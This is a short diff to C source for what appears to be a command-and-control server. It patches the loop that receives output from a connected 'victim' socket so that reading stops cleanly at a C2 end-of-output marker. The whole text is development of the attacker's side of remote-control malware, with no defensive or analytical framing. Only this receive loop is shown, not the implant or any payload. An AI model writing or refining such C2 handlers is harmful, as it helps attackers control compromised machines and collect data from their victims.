@@ -56,11 +56,20 @@ int main() {
         while (1) {
             // Receive up to buffer-1 bytes.
             int n = recv(client_fd, buf, sizeof(buf)-1, 0); 
-            if (n <= 0) { printf("\n[!] Victim disconnected\n"); break; }
+            if (n <= 0) { 
+                printf("\n[!] Victim disconnected\n"); 
+                break; 
+            }
             buf[n] = '\0';
+
+            // Check for EOF marker
+            char *eof_pos = strstr(buf, C2_EOF_MARK);
+            if (eof_pos) {
+                *eof_pos = '\0';
+                printf("%s", buf);
+                break;
+            }
             printf("%s", buf);
-              // Stop when EOF marker detected
-            if (strstr(buf, C2_EOF_MARK)) continue;
         }
     }
     CLOSE_SOCK(client_fd);  
